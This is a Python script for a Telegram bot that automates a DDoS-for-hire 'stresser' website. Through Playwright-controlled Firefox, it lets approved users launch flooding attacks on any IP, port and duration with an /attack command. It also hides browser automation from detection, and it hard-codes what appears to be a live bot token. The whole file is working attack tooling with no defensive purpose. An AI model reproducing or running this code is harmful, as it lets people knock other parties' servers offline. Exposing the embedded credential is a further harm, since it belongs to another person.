import asyncio
import time
import logging
import os
import json
import string
import random
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from playwright.async_api import async_playwright

# --- Configuration ---
BOT_TOKEN = "8546917231:AAFoWXljQnk-O6PTT27D7NHmkZSyXKvEl20"
OWNER_ID = 7820814565

# Firefox paths (Windows default)
FIREFOX_PATH = r"/usr/bin/firefox"
FIREFOX_PROFILE = r"/root/Downloads/ddos/data/Default"

# Data files
DATA_JSON = "users_data.json"

# Logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Global vars
user_state = {}
playwright = None
context = None
page = None
logged_in = False
bot_ready = False

data = {
    "approved_users": {},
    "admins": {},
    "keys": {},
    "disapproved_users": []
}

# --- Firefox Profile Setup ---
def get_firefox_profile_path():
    """Get the most recent Firefox profile"""
    if not os.path.exists(FIREFOX_PROFILE):
        return None
    
    profiles = [f for f in os.listdir(FIREFOX_PROFILE) 
                if f.endswith('.default-release') or f.endswith('.default')]
    
    if profiles:
        return os.path.join(FIREFOX_PROFILE, profiles[0])
    return None

# --- Data Management ---
def load_data():
    global data
    try:
        if os.path.exists(DATA_JSON):
            with open(DATA_JSON, 'r') as f:
                data = json.load(f)
    except Exception as e:
        logger.error(f"Error loading data: {e}")

def save_data():
    try:
        with open(DATA_JSON, 'w') as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        logger.error(f"Error saving data: {e}")

# --- Permission Checks ---
def is_owner(user_id):
    return user_id == OWNER_ID

def is_admin(user_id):
    if user_id == OWNER_ID:
        return True
    return str(user_id) in data.get("admins", {})

def is_approved(user_id):
    if is_admin(user_id):
        return True
    return str(user_id) in data.get("approved_users", {})

# --- Firefox Browser Init ---
async def initialize_browser():
    global playwright, context, page, bot_ready
    try:
        logger.info("Initializing Firefox browser...")
        
        # Get Firefox profile
        profile_path = get_firefox_profile_path()
        logger.info(f"Using profile: {profile_path}")
        
        playwright = await async_playwright().start()
        
        # Firefox launch arguments for persistent context
        context = await playwright.firefox.launch_persistent_context(
            profile_path or "",  # Firefox persistent context needs profile dir
            executable_path=FIREFOX_PATH,
            headless=False,  # Visible mode so you can see the browser
            args=[
                "--no-sandbox",
                "--disable-blink-features=AutomationControlled"
            ]
        )
        
        # Get or create page
        if len(context.pages) > 0:
            page = context.pages[0]
        else:
            page = await context.new_page()
        
        # Simple stealth script for Firefox
        await page.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined
            });
        """)
        
        bot_ready = True
        logger.info("Firefox browser ready with persistent profile")
        return True
        
    except Exception as e:
        logger.error(f"Firefox init error: {e}")
        bot_ready = False
        return False

# --- Bot Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not bot_ready:
        await update.message.reply_text("⏳ Firefox starting... Please wait.")
        return
    
    if is_owner(user_id):
        await update.message.reply_text(
            "👑 **Owner Menu**\nUse /login for browser auth",
            parse_mode='Markdown'
        )
    elif is_approved(user_id):
        await update.message.reply_text(
            "✅ **Attack Menu**\nUse /attack <ip> <port> <time>"
        )
    else:
        await update.message.reply_text(
            "🔑 **Access Required**\nUse /redeem <key>"
        )

async def login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Open login page in Firefox"""
    global page
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    
    if not page:
        await update.message.reply_text("❌ Firefox not ready")
        return
    
    try:
        await page.goto("https://satellitestress.st/login", wait_until="load", timeout=30000)
        await update.message.reply_text("✅ Login page opened in Firefox. Complete login manually.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Launch attack using Firefox"""
    global page
    if not page or not is_approved(update.effective_user.id):
        await update.message.reply_text("❌ Not authorized")
        return
    
    args = context.args
    if len(args) != 3:
        await update.message.reply_text("Use: /attack <ip> <port> <time>")
        return
    
    ip, port, duration = args
    
    try:
        await update.message.reply_text(f"🚀 Attacking {ip}:{port} for {duration}s...")
        
        # Navigate to attack page
        await page.goto("https://satellitestress.st/attack", wait_until="load", timeout=30000)
        await asyncio.sleep(3)
        
        # Fill form (adjust selectors as needed)
        await page.fill("input[placeholder='104.29.138.132']", ip)
        await page.fill("input[placeholder='80']", port)
        await page.fill("input[placeholder='60']", duration)
        
        # Click launch
        await page.click("button:has-text('Launch Attack')")
        
        await update.message.reply_text(f"✅ Attack launched to {ip}:{port}")
        
    except Exception as e:
        await update.message.reply_text(f"❌ Attack failed: {str(e)}")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check browser status"""
    global page, bot_ready
    
    if not bot_ready:
        await update.message.reply_text("❌ Firefox not initialized")
        return
    
    try:
        url = page.url if page else "No page"
        await update.message.reply_text(f"✅ Firefox active\n📍 {url}")
    except:
        await update.message.reply_text("⚠️ Browser state unknown")

# --- Main ---
async def main():
    global bot_ready
    
    print("=" * 50)
    print("🔥 FIREFOX ATTACK BOT")
    print("=" * 50)
    
    # Load data
    load_data()
    
    # Initialize Firefox
    success = await initialize_browser()
    if success:
        print("✅ Firefox ready with profile")
    else:
        print("❌ Firefox init failed - check paths")
    
    # Setup bot
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("login", login))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("status", status))
    
    print("🤖 Bot polling...")
    await app.run_polling()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 Stopped by user")
    except Exception as e:
        logger.error(f"Fatal: {e}")
